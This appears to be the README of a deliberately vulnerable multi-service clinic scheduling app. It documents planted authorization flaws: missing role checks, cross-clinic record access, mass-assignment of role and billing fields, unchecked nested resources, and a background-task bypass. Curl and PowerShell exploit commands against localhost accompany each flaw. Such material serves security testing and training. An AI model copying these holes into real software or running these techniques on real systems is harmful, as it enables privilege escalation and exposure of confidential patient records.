# Clinic Scheduling Platform

Internal scheduling platform for a multi-clinic provider: receptionists book and manage appointments, clinicians review their assigned appointments and write encounter notes, and clinic admins manage staff, configure clinics, approve overrides, and authorize billing.

The platform is composed of three services behind a single ASGI entrypoint:

- a Django + Django REST Framework core (scheduling, users, clinics, encounters)
- a FastAPI analytics & export service mounted at `/svc/analytics`
- a Flask billing/invoicing module mounted at `/svc/finance`

All three services share one SQLite database and one JWT identity issued at login.

## Technology Stack

- Python 3.12
- Django 4.2 + Django REST Framework
- django-guardian, django-rules
- FastAPI + Uvicorn + Starlette
- Flask + Flask-Login + Flask-Principal + Flask-Security-Too + Flask-SQLAlchemy
- PyJWT
- SQLite

## Setup

WSL/Linux/macOS:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python manage.py migrate
python seed.py
```

Windows PowerShell:

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python manage.py migrate
python seed.py
```

## Run

```bash
python -m uvicorn asgi_app:application --port 8080
```

Application URL:
- http://127.0.0.1:8080

## Seeded Accounts

| Username | Password | Role | Clinic |
|----------|----------|------|--------|
| `admin_a` | `Welcome@123` | clinic_admin | 1 (Riverside) |
| `reception_a` | `Welcome@123` | receptionist | 1 (Riverside) |
| `clinician_a` | `Welcome@123` | clinician | 1 (Riverside) |
| `admin_b` | `Welcome@123` | clinic_admin | 2 (Hilltop) |
| `reception_b` | `Welcome@123` | receptionist | 2 (Hilltop) |
| `clinician_b` | `Welcome@123` | clinician | 2 (Hilltop) |

All accounts are authenticated. The `/api/token` endpoint exchanges username/password for a JWT used by the API and the two services.

## Main Routes

- `POST /api/token` — obtain a JWT
- `GET /api/appointments`, `POST /api/appointments`
- `GET/PUT/DELETE /api/appointments/{id}`
- `POST /api/appointments/{id}/approve-override`
- `POST /api/appointments/batch-finalize`, `POST /api/appointments/bulk-update`
- `GET /api/appointments/{appointment_id}/encounters/{encounter_id}`
- `GET /api/clinics/{clinic_id}/report`, `GET /api/clinics/{clinic_id}/private-stats`
- `GET /api/clinics/{clinic_id}/appointments/{appointment_id}`
- `GET /api/encounters/queue`
- `POST /api/users`, `PATCH /api/users/{id}`
- `POST /api/users/{id}/reset-password`, `POST /api/users/{id}/impersonate`, `POST /api/users/{id}/security-settings`
- `POST /api/users/import`, `POST /api/users/sync`
- `GET /documents/library`, `GET /api/documents/latest/download`
- `/clinics/config`, `/clinics/{id}/edit`, `/appointments/export`, `/staff/reconciliation`, `/admin/tools`, `/appointments/{id}/finalize-billing`
- `POST /svc/analytics/export/full`, `POST /svc/analytics/clinics/recompute`, `GET /svc/analytics/my-exports`, `PATCH /svc/analytics/config`
- `POST /svc/finance/invoices`, `PATCH/DELETE /svc/finance/invoices/{id}`, `GET /svc/finance/admin/export`, `PUT /svc/finance/admin/config`, `PATCH /svc/finance/invoices/{id}/fields`, `POST /svc/finance/webhooks/invoice-paid`

## Authorization Patterns and Access

### 1) Function or Endpoint-Level (BFLA)
Privileged operations execute for any authenticated actor with no role/permission check: creating staff and changing roles, resetting another user's password, impersonating another user, changing another user's MFA / rotating credentials, deleting appointments, approving overrides, the batch appointment finalize worker (an alternate path to the single billing-finalize/approve flow), clinic configuration pages, full appointment export, the staff reconciliation dashboard, admin tools, billing finalization, analytics full export and recompute, all finance invoice/config operations, and the invoice-paid webhook handler.

### 2) Object or Record-Level (BOLA)
List/queue/report/file endpoints return records selected by server-side context without an access-boundary check: the appointment list returns every clinic's appointments, the encounter queue returns all encounters, the clinic report and private-stats endpoints return data for any clinic, the document library and the latest-document download return documents from any clinic (including confidential ones), and analytics "my exports" returns every user's rows.

### 3) Object Property or Field-Level (BOPLA)
Create/update/bulk/import/sync endpoints bind caller input to privileged fields (`approval_status`, `billing_status`, `override_approved`, `role`, `is_staff`, clinic `status`) without field-level authorization — including the bulk appointment update, the staff import, and the staff synchronization, which apply those fields across many records — and responses return internal fields (`internal_billing_note`) to any role.

### 4) Nested and Chained Resource Authorization
`/appointments/{appointment_id}/encounters/{encounter_id}` returns the child encounter with no independent confidentiality check; `/clinics/{clinic_id}/appointments/{appointment_id}` loads the appointment by its own id without validating it belongs to the clinic in the path.

## Verify Sinks

Every sink below has reproducible commands for Linux/macOS (`curl`) and Windows (`PowerShell`) — no manual browser steps. All tests act as `reception_a` (an authenticated **receptionist in clinic 1**), an under-privileged user, and each reaches a privileged operation, another clinic's records, or a privileged field. Restart the app to reset data after state-changing tests.

Seeded data reference:

| Entity | IDs | Notes |
|--------|-----|-------|
| Clinics | 1 (Riverside), 2 (Hilltop) | reception_a belongs to clinic 1 |
| Appointments | 1,2 (clinic 1), 3,4 (clinic 2) | |
| Encounters | 1,3 (normal), 2,4 (confidential/draft) | encounter 4 belongs to appointment 4 (clinic 2) |

### Setup — token and browser session

**Linux / macOS:**

```bash
BASE=http://127.0.0.1:8080
# JWT for the API and the FastAPI/Flask services
TOKEN=$(curl -s -X POST $BASE/api/token -H "Content-Type: application/json" \
  -d '{"username":"reception_a","password":"Welcome@123"}' \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
AUTH="Authorization: Bearer $TOKEN"
# Django session (for the server-rendered pages B4-B8, P4)
curl -s -c jar.txt $BASE/login -o /dev/null
CSRF=$(awk '/csrftoken/ {print $7}' jar.txt)
curl -s -b jar.txt -c jar.txt -e $BASE/login \
  --data "username=reception_a&password=Welcome@123&csrfmiddlewaretoken=$CSRF" \
  $BASE/login -o /dev/null
```

**Windows (PowerShell):**

```powershell
$BASE = "http://127.0.0.1:8080"
$token = (Invoke-RestMethod -Uri $BASE/api/token -Method Post -Body (@{username="reception_a";password="Welcome@123"} | ConvertTo-Json) -ContentType "application/json").token
$H = @{ Authorization = "Bearer $token" }
$S = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest -Uri $BASE/login -WebSession $S -UseBasicParsing | Out-Null
$csrf = ($S.Cookies.GetCookies($BASE) | Where-Object Name -eq "csrftoken").Value
Invoke-WebRequest -Uri $BASE/login -Method Post -WebSession $S -Body @{username="reception_a";password="Welcome@123";csrfmiddlewaretoken=$csrf} -Headers @{Referer="$BASE/login"} -UseBasicParsing | Out-Null
```

### Function or Endpoint-Level (BFLA)

#### B1 — Create user / assign role
```bash
curl -s -X POST $BASE/api/users -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"username":"mallory","email":"m@x.io","role":"clinic_admin","password":"Welcome@123"}' -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/api/users -Method Post -Headers $H -ContentType "application/json" -Body '{"username":"mallory","email":"m@x.io","role":"clinic_admin","password":"Welcome@123"}' -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `201` — a receptionist creates a `clinic_admin` account.

#### B2 — Delete appointment
```bash
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE $BASE/api/appointments/2 -H "$AUTH"
```
```powershell
Invoke-WebRequest -Uri $BASE/api/appointments/2 -Method Delete -Headers $H -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `204` — appointment deleted by a receptionist.

#### B3 — Approve override
```bash
curl -s -X POST $BASE/api/appointments/1/approve-override -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/api/appointments/1/approve-override -Method Post -Headers $H -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200`, `approval_status=approved`, `override_approved=true`.

#### B4 — Clinic configuration page
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt $BASE/clinics/config
```
```powershell
(Invoke-WebRequest -Uri $BASE/clinics/config -WebSession $S -UseBasicParsing).StatusCode
```
**Expected:** `200` — config page rendered for a receptionist.

#### B5 — Export all appointments (CSV)
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt $BASE/appointments/export
```
```powershell
(Invoke-WebRequest -Uri $BASE/appointments/export -WebSession $S -UseBasicParsing).StatusCode
```
**Expected:** `200` — CSV of every appointment downloaded.

#### B6 — Staff reconciliation dashboard
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt $BASE/staff/reconciliation
```
```powershell
(Invoke-WebRequest -Uri $BASE/staff/reconciliation -WebSession $S -UseBasicParsing).StatusCode
```
**Expected:** `200` — staff-only dashboard rendered for a receptionist.

#### B7 — Clinic admin tools
```bash
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt $BASE/admin/tools
```
```powershell
(Invoke-WebRequest -Uri $BASE/admin/tools -WebSession $S -UseBasicParsing).StatusCode
```
**Expected:** `200` — admin tools rendered for a receptionist.

#### B8 — Finalize billing
```bash
CSRF=$(awk '/csrftoken/ {print $7}' jar.txt)
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt -e $BASE/login \
  --data "csrfmiddlewaretoken=$CSRF" $BASE/appointments/1/finalize-billing
```
```powershell
$csrf = ($S.Cookies.GetCookies($BASE) | Where-Object Name -eq "csrftoken").Value
(Invoke-WebRequest -Uri $BASE/appointments/1/finalize-billing -Method Post -WebSession $S -Body @{csrfmiddlewaretoken=$csrf} -Headers @{Referer="$BASE/login"} -UseBasicParsing).StatusCode
```
**Expected:** curl returns `302` (redirect after the change); PowerShell follows the redirect to `200`. Appointment is marked `finalized`/`approved`.

#### F1 — Analytics full export
```bash
curl -s -X POST $BASE/svc/analytics/export/full -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/analytics/export/full -Method Post -Headers $H -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200` — full export runs for all clinics.

#### F2 — Recompute clinic metrics
```bash
curl -s -X POST $BASE/svc/analytics/clinics/recompute -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/analytics/clinics/recompute -Method Post -Headers $H -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200` — metrics recomputed for all clinics.

#### FL1 — Issue invoice
```bash
curl -s -X POST $BASE/svc/finance/invoices -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"appointment_id":1,"clinic_id":1,"amount":100}' -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/finance/invoices -Method Post -Headers $H -ContentType "application/json" -Body '{"appointment_id":1,"clinic_id":1,"amount":100}' -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `201` — invoice issued by a receptionist.

#### FL2 — Adjust invoice
```bash
curl -s -X PATCH $BASE/svc/finance/invoices/1 -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"amount":5,"status":"waived"}' -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/finance/invoices/1 -Method Patch -Headers $H -ContentType "application/json" -Body '{"amount":5,"status":"waived"}' -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200` — invoice amount/status changed.

#### FL3 — Finance admin export
```bash
curl -s $BASE/svc/finance/admin/export -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/finance/admin/export -Headers $H -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200` — all invoices returned.

#### FL4 — Finance admin config
```bash
curl -s -X PUT $BASE/svc/finance/admin/config -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"currency":"USD","tax_rate":0.5,"late_fee":9,"statement_footer":"z"}' -w "\n%{http_code}\n"
```
```powershell
Invoke-WebRequest -Uri $BASE/svc/finance/admin/config -Method Put -Headers $H -ContentType "application/json" -Body '{"currency":"USD","tax_rate":0.5,"late_fee":9,"statement_footer":"z"}' -UseBasicParsing | Select-Object StatusCode
```
**Expected:** `200` — finance configuration changed.

#### B9 — Reset another user's password
```bash
curl -s -X POST $BASE/api/users/4/reset-password -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/4/reset-password -Method Post -Headers $H | Select-Object username,temporary_password
```
**Expected:** `200` — a receptionist resets `admin_b`'s password and receives a usable `temporary_password`.

#### B10 — Impersonate another user
```bash
curl -s -X POST $BASE/api/users/4/impersonate -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/4/impersonate -Method Post -Headers $H | Select-Object username,role,token
```
**Expected:** `200` — a JWT is minted for `admin_b`.

#### B11 — Change another user's MFA / rotate credentials
```bash
curl -s -X POST $BASE/api/users/4/security-settings -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"mfa_enabled":true,"rotate_credentials":true}' -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/4/security-settings -Method Post -Headers $H -ContentType "application/json" -Body '{"mfa_enabled":true,"rotate_credentials":true}' | Select-Object username,mfa_enabled,security_version
```
**Expected:** `200` — `admin_b`'s `mfa_enabled` is set and `security_version` is incremented.

#### B12 — Batch finalize appointments (worker/batch alternate path)
```bash
curl -s -X POST $BASE/api/appointments/batch-finalize -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments/batch-finalize -Method Post -Headers $H | Select-Object count,finalized
```
**Expected:** `200` — every appointment is marked `finalized`/`approved` via the same `finalize_appointment` helper the single `finalize-billing` path uses.

#### FL5 — Invoice-paid webhook
```bash
curl -s -X POST $BASE/svc/finance/webhooks/invoice-paid -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"invoice_id":1}' -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/svc/finance/webhooks/invoice-paid -Method Post -Headers $H -ContentType "application/json" -Body '{"invoice_id":1}'
```
**Expected:** `200` — invoice 1 is set to `paid` by an authenticated receptionist with no role check. (Run FL1 first so invoice 1 exists.)

#### B13 — Clinic configuration edit without management role
```bash
CSRF=$(awk '/csrftoken/ {print $7}' jar.txt)
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt -e $BASE/login \
  --data "csrfmiddlewaretoken=$CSRF&name=Hilltop Medical Center&location=Hilltop&weekly_capacity=999&intake_notes=x&status=active" \
  $BASE/clinics/2/edit
curl -s -b jar.txt $BASE/clinics/config | grep -o 999
```
```powershell
$csrf = ($S.Cookies.GetCookies($BASE) | Where-Object Name -eq "csrftoken").Value
(Invoke-WebRequest -Uri $BASE/clinics/2/edit -Method Post -WebSession $S -Body @{csrfmiddlewaretoken=$csrf;name="Hilltop Medical Center";location="Hilltop";weekly_capacity="999";intake_notes="x";status="active"} -Headers @{Referer="$BASE/login"} -UseBasicParsing).StatusCode
```
**Expected:** `302` and clinic 2's `weekly_capacity` is now `999` — a receptionist (no `change_panel` permission) performs the privileged clinic-configuration write on another clinic. (Safe → `403`.)

### Object or Record-Level (BOLA)

#### O1 — Appointment list (cross-clinic)
```bash
curl -s $BASE/api/appointments -H "$AUTH"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments -Headers $H | Format-Table id,clinic,clinician,status -AutoSize
```
**Expected:** `200` and the list includes clinic 2 rows (clinic ids 1 and 2).

#### O2 — Encounter queue (all encounters)
```bash
curl -s $BASE/api/encounters/queue -H "$AUTH"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/encounters/queue -Headers $H | Format-Table id,appointment,clinician,confidential -AutoSize
```
**Expected:** `200` and other clinicians' encounters are returned.

#### O3 — Clinic report for another clinic
```bash
curl -s -o /dev/null -w "%{http_code}\n" $BASE/api/clinics/2/report -H "$AUTH"
```
```powershell
(Invoke-WebRequest -Uri $BASE/api/clinics/2/report -Headers $H -UseBasicParsing).StatusCode
```
**Expected:** `200` — a clinic-1 user reads clinic 2's report.

#### O4 — Clinic private stats for another clinic
```bash
curl -s -o /dev/null -w "%{http_code}\n" $BASE/api/clinics/2/private-stats -H "$AUTH"
```
```powershell
(Invoke-WebRequest -Uri $BASE/api/clinics/2/private-stats -Headers $H -UseBasicParsing).StatusCode
```
**Expected:** `200` — a clinic-1 user reads clinic 2's private stats.

#### O5 — Analytics "my exports" (all users)
```bash
curl -s $BASE/svc/analytics/my-exports -H "$AUTH"
```
```powershell
(Invoke-RestMethod -Uri $BASE/svc/analytics/my-exports -Headers $H).exports | Format-Table id,requested_by_name,clinic_id,scope -AutoSize
```
**Expected:** `200` and rows requested by other users are returned (the `requested_by_name` column shows names other than `reception_a`). (Run F1 first to populate export rows.)

#### O6 — Document library (cross-clinic)
```bash
curl -s -b jar.txt $BASE/documents/library | grep -c Hilltop
```
```powershell
((Invoke-WebRequest -Uri $BASE/documents/library -WebSession $S -UseBasicParsing).Content | Select-String -Pattern "Hilltop" -AllMatches).Matches.Count
```
**Expected:** non-zero — a clinic-1 receptionist sees clinic 2 (Hilltop) documents, including confidential ones, in the library.

#### O7 — Latest document download (cross-clinic)
```bash
curl -s $BASE/api/documents/latest/download -H "$AUTH" -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/documents/latest/download -Headers $H
```
**Expected:** `200` — the most recent document is streamed regardless of clinic (seeded latest is the Hilltop confidential lab interpretation).

#### O8 — Appointment detail/update (another clinic's record)
```bash
curl -s $BASE/api/appointments/4 -H "$AUTH"
curl -s -o /dev/null -w "%{http_code}\n" -X PUT $BASE/api/appointments/4 -H "$AUTH" \
  -H "Content-Type: application/json" -d '{"reason":"tampered","status":"cancelled"}'
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments/4 -Headers $H | Select-Object id,clinic,reason,status
(Invoke-WebRequest -Uri $BASE/api/appointments/4 -Method Put -Headers $H -ContentType "application/json" -Body '{"reason":"tampered","status":"cancelled"}' -UseBasicParsing).StatusCode
```
**Expected:** `200` — a clinic-1 receptionist reads and modifies appointment 4 (clinic 2); the detail endpoint applies no access-boundary check. (Safe → `403`.)

#### O9 — Modify another user's record
```bash
curl -s -o /dev/null -w "%{http_code}\n" -X PATCH $BASE/api/users/5 -H "$AUTH" \
  -H "Content-Type: application/json" -d '{"email":"hacked@x.io"}'
```
```powershell
(Invoke-WebRequest -Uri $BASE/api/users/5 -Method Patch -Headers $H -ContentType "application/json" -Body '{"email":"hacked@x.io"}' -UseBasicParsing).StatusCode
```
**Expected:** `200` — a receptionist modifies `reception_b` (user 5)'s record; the update endpoint verifies neither ownership nor role. (Safe → `403`.)

### Object Property or Field-Level (BOPLA)

#### P1 — Privileged fields on appointment create
```bash
curl -s -X POST $BASE/api/appointments -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"clinic":1,"patient":1,"scheduled_for":"2030-01-01T10:00:00Z","reason":"x","approval_status":"approved","override_approved":true}'
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments -Method Post -Headers $H -ContentType "application/json" -Body '{"clinic":1,"patient":1,"scheduled_for":"2030-01-01T10:00:00Z","reason":"x","approval_status":"approved","override_approved":true}' | Select-Object approval_status,override_approved
```
**Expected:** `201` and the response shows `approval_status=approved`, `override_approved=true`.

#### P2 — Privileged fields on profile update (role / is_staff / clinic)
```bash
curl -s -X PATCH $BASE/api/users/2 -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"role":"clinic_admin","is_staff":true,"clinic":2}'
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/2 -Method Patch -Headers $H -ContentType "application/json" -Body '{"role":"clinic_admin","is_staff":true,"clinic":2}' | Select-Object role,is_staff,clinic
```
**Expected:** `200` and the receptionist's own record becomes `role=clinic_admin`, `is_staff=true`, `clinic=2` — moving oneself to another clinic also re-opens the appointment-list scoping (`GET /api/appointments` then returns clinic 2). (Safe → all three fields ignored.)

#### P3 — Internal field exposed in response
```bash
curl -s $BASE/api/appointments/1 -H "$AUTH"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments/1 -Headers $H | Select-Object internal_billing_note
```
**Expected:** `200` and the response includes `internal_billing_note`.

#### P5 — Analytics config privileged key
```bash
curl -s -X PATCH $BASE/svc/analytics/config -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"internal_flag":1,"weight":9.9}'
```
```powershell
Invoke-RestMethod -Uri $BASE/svc/analytics/config -Method Patch -Headers $H -ContentType "application/json" -Body '{"internal_flag":1,"weight":9.9}'
```
**Expected:** `200` and `config.internal_flag` is set to `1`.

#### P6 — Invoice field tamper
```bash
curl -s -X PATCH $BASE/svc/finance/invoices/1/fields -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"status":"paid","amount":0}'
```
```powershell
Invoke-RestMethod -Uri $BASE/svc/finance/invoices/1/fields -Method Patch -Headers $H -ContentType "application/json" -Body '{"status":"paid","amount":0}'
```
**Expected:** `200` and `applied` contains `status`/`amount` (invoice set to `paid`). (Run FL1 first so invoice 1 exists.)

#### P4 — Clinic privileged field via ModelForm
```bash
CSRF=$(awk '/csrftoken/ {print $7}' jar.txt)
curl -s -o /dev/null -w "%{http_code}\n" -b jar.txt -e $BASE/login \
  --data "csrfmiddlewaretoken=$CSRF&name=Riverside Family Clinic&location=Riverside&weekly_capacity=140&intake_notes=x&status=suspended" \
  $BASE/clinics/1/edit
curl -s -b jar.txt $BASE/clinics/config | grep -o suspended
```
```powershell
$csrf = ($S.Cookies.GetCookies($BASE) | Where-Object Name -eq "csrftoken").Value
Invoke-WebRequest -Uri $BASE/clinics/1/edit -Method Post -WebSession $S -Body @{csrfmiddlewaretoken=$csrf;name="Riverside Family Clinic";location="Riverside";weekly_capacity="140";intake_notes="x";status="suspended"} -Headers @{Referer="$BASE/login"} -UseBasicParsing | Out-Null
((Invoke-WebRequest -Uri $BASE/clinics/config -WebSession $S -UseBasicParsing).Content -match "suspended")
```
**Expected:** the edit is accepted (`302`/`200`) and the clinic config page shows `suspended` — the privileged `status` field was set through the form.

#### P7 — Bulk appointment update sets privileged fields across records
```bash
curl -s -X POST $BASE/api/appointments/bulk-update -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"appointments":[{"id":1,"approval_status":"approved","override_approved":true},{"id":2,"billing_status":"finalized"}]}'
curl -s $BASE/api/appointments/1 -H "$AUTH" | grep -o '"approval_status":"approved"'
```
```powershell
Invoke-RestMethod -Uri $BASE/api/appointments/bulk-update -Method Post -Headers $H -ContentType "application/json" -Body '{"appointments":[{"id":1,"approval_status":"approved","override_approved":true},{"id":2,"billing_status":"finalized"}]}'
Invoke-RestMethod -Uri $BASE/api/appointments/1 -Headers $H | Select-Object approval_status,override_approved
```
**Expected:** `200` and appointment 1 becomes `approval_status=approved`, `override_approved=true` — privileged fields set in bulk.

#### P8 — Staff import mass-assigns `role`/`is_staff`
```bash
curl -s -X POST $BASE/api/users/import -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"users":[{"username":"imported_admin","email":"ia@x.io","role":"clinic_admin","is_staff":true}]}' -w "\n%{http_code}\n"
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/import -Method Post -Headers $H -ContentType "application/json" -Body '{"users":[{"username":"imported_admin","email":"ia@x.io","role":"clinic_admin","is_staff":true}]}' | Select-Object count,created
```
**Expected:** `201` — a `clinic_admin` account is created through the import (role/is_staff taken from input; clinic forced to the caller's).

#### P9 — Staff sync escalates an existing user's role
```bash
curl -s -X POST $BASE/api/users/sync -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"users":[{"id":2,"role":"clinic_admin","is_staff":true}]}'
```
```powershell
Invoke-RestMethod -Uri $BASE/api/users/sync -Method Post -Headers $H -ContentType "application/json" -Body '{"users":[{"id":2,"role":"clinic_admin","is_staff":true}]}' | Select-Object count,synced
```
**Expected:** `200` — `reception_a` (user 2, same clinic) is escalated to `role=clinic_admin` via the sync endpoint.

### Nested and Chained Resource Authorization

#### N1 — Nested confidential encounter (child unchecked)
```bash
curl -s -o /dev/null -w "%{http_code}\n" $BASE/api/appointments/4/encounters/4 -H "$AUTH"
```
```powershell
(Invoke-WebRequest -Uri $BASE/api/appointments/4/encounters/4 -Headers $H -UseBasicParsing).StatusCode
```
**Expected:** `200` — the confidential encounter 4 (clinic 2) is returned with no child-level check.

#### N2 — Parent-child binding not validated
```bash
curl -s -o /dev/null -w "%{http_code}\n" $BASE/api/clinics/1/appointments/3 -H "$AUTH"
```
```powershell
(Invoke-WebRequest -Uri $BASE/api/clinics/1/appointments/3 -Headers $H -UseBasicParsing).StatusCode
```
**Expected:** `200` — appointment 3 (clinic 2) is returned under clinic 1's path.

## Role Flows

- **receptionist** — schedule and manage appointments and patients for their clinic
- **clinician** — review assigned appointments and write encounter notes
- **clinic_admin** — manage staff and roles, configure clinics, approve overrides, run exports, and authorize billing

## Deferred Insurance-Claim Submission via Internal Service Identity (asynchronous BFLA)

Submitting an insurance claim for an appointment is a privileged billing action: only a `clinic_admin` of the appointment's clinic may do it. It is exposed through two paths that share one rule, `can_submit_claim(actor, appointment)` — a plain function that takes the actor explicitly (not the request), so it is reusable from a background thread, and decides on the **appointment's clinic**, not just on the claim object.

- **Synchronous, correctly gated:** `POST /api/appointments/{id}/submit-claim` calls `can_submit_claim(request.user, appointment)` and returns `403` for a receptionist.
- **Deferred, vulnerable:** `POST /api/appointments/{id}/request-claim-submission` only verifies the caller may act within the appointment's clinic, then dispatches an internal background task (`threading.Thread`) that mints a service-account token and submits the claim under the application's own service identity (`service-account`). The task **executes under the service identity without evaluating the originating actor's authorization** — it never calls `can_submit_claim` for the actor that requested the submission. The role check enforced on the synchronous path is bypassed on the deferred path.

Authentication is always required (CWE-862, not CWE-306), and the receptionist requests submission for an appointment in their own clinic that they may already view (not IDOR/CWE-639). The missing control is the function-level role check on the deferred execution path.

| Category | Operation | Source | Sink | Vulnerable here | File:line |
|---|---|---|---|---|---|
| BFLA (deferred / internal task, service identity) | Submit insurance claim for an appointment | `POST /api/appointments/{id}/request-claim-submission` (`scheduling/views.py:282`) dispatches `dispatch_claim_submission(...)` (`scheduling/views.py:297`) to a background thread (`services/internal_tasks.py:39`) | `InsuranceClaim.objects.create(...)` in `_run(...)` (`services/internal_tasks.py:29`) | the internal task runs under the `service-account` identity and never calls `can_submit_claim` for the requesting actor | `services/internal_tasks.py:29` |

Contrast (gated, same rule): synchronous `POST /api/appointments/{id}/submit-claim` — `scheduling/views.py:264` (`can_submit_claim(request.user, appointment)`).

### Verify

`reception_a` is a receptionist and `admin_a` is a `clinic_admin`, both in the Riverside clinic. Use an appointment id in that clinic (the first one returned by `GET /api/appointments`).

**Linux / macOS:**

```bash
B=http://localhost:8080
RTOK=$(curl -s -X POST $B/api/token -H "Content-Type: application/json" -d '{"username":"reception_a","password":"Welcome@123"}' | python -c "import sys,json;print(json.load(sys.stdin)['token'])")
APPT=$(curl -s $B/api/appointments -H "Authorization: Bearer $RTOK" | python -c "import sys,json;print(json.load(sys.stdin)[0]['id'])")
# Synchronous gated path: receptionist denied
curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/appointments/$APPT/submit-claim -H "Authorization: Bearer $RTOK"               # 403
# Deferred path: receptionist requests the same privileged submission
curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/appointments/$APPT/request-claim-submission -H "Authorization: Bearer $RTOK"   # 202
sleep 2
# The internal task created the claim under the service identity, with no actor authorization
python -c "import sqlite3;print(list(sqlite3.connect('data/clinic.db').execute('SELECT appointment_id,status,submitted_by FROM scheduling_insuranceclaim')))"
```

**Windows (PowerShell):**

```powershell
$B="http://localhost:8080"
$RTOK=(Invoke-RestMethod -Uri "$B/api/token" -Method POST -ContentType "application/json" -Body '{"username":"reception_a","password":"Welcome@123"}').token
$h=@{ Authorization = "Bearer $RTOK" }
$APPT=(Invoke-RestMethod -Uri "$B/api/appointments" -Headers $h)[0].id
try { (Invoke-WebRequest -Uri "$B/api/appointments/$APPT/submit-claim" -Method POST -Headers $h -UseBasicParsing).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }   # 403
(Invoke-WebRequest -Uri "$B/api/appointments/$APPT/request-claim-submission" -Method POST -Headers $h -UseBasicParsing).StatusCode   # 202
```

**Expected:** the synchronous path returns `403` for the receptionist; the deferred path returns `202` and the background task creates an `InsuranceClaim` row with `submitted_by = service-account` — a privileged submission the receptionist could not perform directly, executed by the internal task without evaluating her authorization. In the safe project the task evaluates `can_submit_claim` on the originating actor and creates no claim when the actor is not a `clinic_admin` of that clinic.
